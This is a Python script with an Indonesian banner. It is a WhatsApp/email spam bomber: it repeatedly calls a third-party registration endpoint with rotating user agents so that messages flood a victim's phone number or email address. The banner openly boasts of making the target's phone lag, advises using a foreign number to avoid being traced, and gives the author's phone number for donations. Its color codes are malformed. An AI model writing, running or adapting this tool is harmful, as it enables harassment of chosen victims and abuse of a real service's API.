#-*- coding: utf8 -*-
import requests,random,time,os,sys
req=requests.Session()

r='\1[1m'
c='\1[1m'
w='\1[1m'

__banner__ = ('''
#BANYAKIN SPAM BIAR MAMPUS :V
#SPAM WHATSAP BIAR NGELAG
#KHUSUS YANG JOMBLO
#SEMOGA DOSA ANDA BERLIMPAH
#JANGAN DIJUAL,ANDA JUAL JOMBLO SEUMUR HIDUR
#PAKAI NOMOR LUAR BANG BIAR GAK KETAUAN
#PAKAI APK 2endline oke
#JANGAN LUPA BERSYUKUR
#DONASI VIA PULSA DONK,089627810867,MAKACIH 😂🤣
#KONTAK PEMBUAT Whatsap 089627810867
%s
 ###############################
 # %scode : Alex             %s#
 # %stype : wa/email             %s#
 # %steam : CodeBAlex            %s#
 ###############################%s
    ''' % (c,w,c,w,c,w,c,w))


class Mate_lampu():
        def __init__(self):
            self.ua=open('ua.txt').read().splitlines()
            os.system('clear')
            print(__banner__)
            self.sok_aelu()
        def sok_aelu(self):
            type = str(input('[?] type: '))
            if type=='wa':
                self.tolol = 'phone_number'
                self.goblok=str(input('[?] Nomor Whatsappnya?: '))
            elif type=='email':
                self.tolol = 'email'
                self.goblok=str(input('[?] email: '))
            else:
                Mate_lampu()
            self.spam_kuy()

        def spam_kuy(self):
            saapa=int(input('[?] jumlah Spam: '))
            print('[!] Delay 2 Detik Bos :V')
            for i in range(1,saapa+1):
                req.headers.update({'user-agent':random.choice(self.ua)});ceko = req.post('https://core.ktbs.io/v2/user/registration/temp', json = {'full_name':'Maoundis','user_id':self.goblok,'user_id_type':self.tolol})
                if ceko.status_code == 200:
                    print('  %s[%d] pesan: %Berhasil Melakukan Spam (By CodeBAlex) :"c ' % (w,i,c))
                else:
                    print('  %s[%d] pesan: %s%s' % (w,i,r,ceko.json()['errors'][0]['details']['id']))
                time.sleep(2)
                continue
            quit('%s[%s#%s]%s Selesai Bos,Jangan Lupa Berikan Donasi Ya😂 ,,,,' % (r,c,r,w))







# -----main -------

#try:
sys.exit(Mate_lampu())
#except Exception as _er:
#    quit('%serror: %s' % (r,_er))
